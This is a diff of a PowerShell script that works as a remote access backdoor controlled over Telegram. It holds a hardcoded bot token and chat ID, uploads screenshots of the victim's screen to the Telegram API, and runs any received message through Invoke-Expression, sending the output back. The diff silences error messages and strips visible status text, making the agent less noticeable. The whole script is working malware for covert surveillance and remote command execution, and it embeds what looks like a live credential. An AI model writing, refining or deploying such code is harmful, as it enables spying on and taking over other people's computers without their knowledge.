@@ -3,48 +3,47 @@ $botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
 $chatId = "6494641721"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 
-function Send-TG ($text, $isPath=$false) {
+function Send-TG ($t, $isPath=$false) {
     try {
-        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$text" "$apiUrl/sendPhoto" }
+        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$t" "$apiUrl/sendPhoto" }
         else {
-            $body = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $text"; parse_mode="Markdown"}
-            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $body -ErrorAction Stop
+            $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
+            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
         }
-    } catch { Write-Host "TG Error" }
+    } catch { }
 }
 
-Send-TG "🚀 *Agent Online!* Type /help"
+Send-TG "Agent Online"
 $lastId = 0
 
 while ($true) {
     try {
-        $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
-        foreach ($u in $updates.result) {
+        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId + 1)&timeout=20" -ErrorAction Stop
+        foreach ($u in $res.result) {
             $lastId = $u.update_id
-            $msgText = $u.message.text
+            $msg = $u.message.text
             if ($u.message.from.id -eq $chatId) {
-                switch ($msgText) {
-                    "/start" { Send-TG "✅ System Ready." }
-                    "/help"  { Send-TG "📜 *Commands:*`n🔹shot - screenshot`n🔹kill - stop agent`n🔹_Type PS command to execute_" }
+                switch ($msg) {
+                    "/start" { Send-TG "Ready" }
+                    "/help"  { Send-TG "shot, kill, or cmd" }
                     "shot" {
-                        Send-TG "📸 Taking screenshot..."
                         Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                        $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
-                        $bitmap = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
-                        $graphics = [Drawing.Graphics]::FromImage($bitmap)
-                        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-                        $tempPath = "$env:TEMP\s.png"; $bitmap.Save($tempPath, [Drawing.Imaging.ImageFormat]::Png)
-                        $graphics.Dispose(); $bitmap.Dispose()
-                        Send-TG $tempPath $true
-                        if(Test-Path $tempPath){ rm $tempPath }
+                        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
+                        $g = [Drawing.Graphics]::FromImage($b)
+                        $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
+                        $tmp = "$env:TEMP\s.png"; $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
+                        $g.Dispose(); $b.Dispose()
+                        Send-TG $tmp $true
+                        if(Test-Path $tmp){ rm $tmp }
                     }
-                    "kill" { Send-TG "💀 Offline."; exit }
+                    "kill" { Send-TG "Offline"; exit }
                     default {
                         try {
-                            $out = Invoke-Expression $msgText 2>&1 | Out-String
-                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "✅ Done" } else { "🖥 *Result:*`n$out" }
+                            $out = Invoke-Expression $msg 2>&1 | Out-String
+                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done" } else { $out }
                             Send-TG $resOut
-                        } catch { Send-TG "❌ Error: $($_.Exception.Message)" }
+                        } catch { Send-TG "Error" }
                     }
                 }
             }
